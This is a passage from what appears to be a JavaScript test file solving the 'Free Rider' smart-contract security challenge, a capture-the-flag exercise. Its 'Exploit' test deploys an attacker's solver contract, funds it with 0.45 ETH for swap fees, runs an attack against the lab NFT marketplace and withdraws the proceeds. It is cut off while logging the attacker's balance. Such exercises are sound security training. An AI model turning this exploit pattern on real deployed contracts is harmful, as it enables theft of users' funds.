...
describe("[Challenge] Free Rider", function () {
    ...
    it("Exploit", async function () {
        ...
        const solver = await (
            await ethers.getContractFactory("FreeRiderSolver", attacker)
        ).deploy(this.marketplace.address, this.buyerContract.address, this.uniswapPair.address)

        const initialEthForSwapFee = ethers.utils.parseEther("0.45")
        await solver.depositAndConvertToWeth({ value: initialEthForSwapFee })
        await solver.attack(NFT_PRICE)

        await solver.withdrawEth()
        console.log(
            `Attacker ETH balance = ${ethers.utils.formatEther(
